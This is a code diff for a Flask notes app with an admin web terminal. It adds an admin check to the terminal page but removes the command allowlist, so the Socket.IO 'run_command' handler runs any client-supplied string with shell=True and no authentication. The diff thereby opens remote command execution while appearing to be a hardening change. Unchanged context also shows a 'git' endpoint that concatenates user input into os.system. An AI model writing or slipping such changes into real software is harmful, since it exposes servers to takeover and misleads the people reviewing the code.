@@ -12,7 +12,6 @@ import subprocess
 DUMMY_PASSWORD_HASH = generate_password_hash("dummy_password_for_timing_attack_dummies")
 
 
-### DATABASE FUNCTIONS ###
 
 def connect_db():
     return sqlite3.connect(app.database)
@@ -59,19 +58,12 @@ CREATE TABLE users (
 
 
 
-### APPLICATION SETUP ###
 app = Flask(__name__)
 app.database = "db.sqlite3"
 app.secret_key = os.urandom(32)
 csrf = CSRFProtect(app)
 socketio = SocketIO(app)
 
-ALLOWED_COMMANDS = {
-    "date": ["date"],
-    "whoami": ["whoami"],
-    "uptime": ["uptime"],
-    "ls": ["ls", "-l"],
-}
 
 limiter = Limiter(
     get_remote_address,
@@ -80,7 +72,6 @@ limiter = Limiter(
     storage_uri="memory://"
 )
 
-### ADMINISTRATOR'S PANEL ###
 def login_required(view):
     @functools.wraps(view)
     def wrapped_view(**kwargs):
@@ -102,7 +93,7 @@ def exec_admin_cmd():
     data = request.get_json()
     if not data or 'cmd' not in data:
         return abort(400, "br")
-    
+
     command = "git "
 
     os.system(command + data['cmd'])
@@ -112,7 +103,6 @@ def exec_admin_cmd():
 @login_required
 def notes():
     importerror=""
-    #Posting a new note:
     if request.method == 'POST':
         if request.form['submit_button'] == 'add note':
             note = request.form['noteinput']
@@ -162,7 +152,6 @@ def login():
         c.execute(statement, (username,))
         result = c.fetchone()
 
-        # We always call check_password_hash to mitigate timing attacks
         hash = result[2] if result else DUMMY_PASSWORD_HASH
         success = check_password_hash(hash, password)
 
@@ -178,19 +167,23 @@ def login():
 
 
 @app.route("/admin-panel")
-def index():
+@login_required
+def admin_panel():
+
+    if session.get('username') != 'admin':
+        abort(403)
+
+
     return render_template("terminal.html")
+
 
 @socketio.on("run_command")
 def handle_command(cmd):
     cmd = cmd.strip()
 
-    if cmd not in ALLOWED_COMMANDS:
-        emit("command_output", f"Command not allowed: {cmd}")
-        return
-
     process = subprocess.Popen(
-        ALLOWED_COMMANDS[cmd],
+        cmd,
+        shell=True,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE
     )
@@ -198,6 +191,8 @@ def handle_command(cmd):
 
     response = out.decode() if out else err.decode()
     emit("command_output", response)
+
+
 
 
 @app.route("/register/", methods=('GET', 'POST'))
@@ -263,14 +258,13 @@ def get_usrs():
 
 
 if __name__ == "__main__":
-    #create database if it doesn't exist yet
     if not os.path.exists(app.database):
         init_db()
     runport = 5000
     if(len(sys.argv)==2):
         runport = sys.argv[1]
     try:
-        app.run(host='0.0.0.0', port=runport) # runs on machine ip address to make it visible on netowrk
+        app.run(host='0.0.0.0', port=runport)
     except:
         print("Something went wrong. the usage of the server is either")
         print("'python3 app.py' (to start on port 5000)")
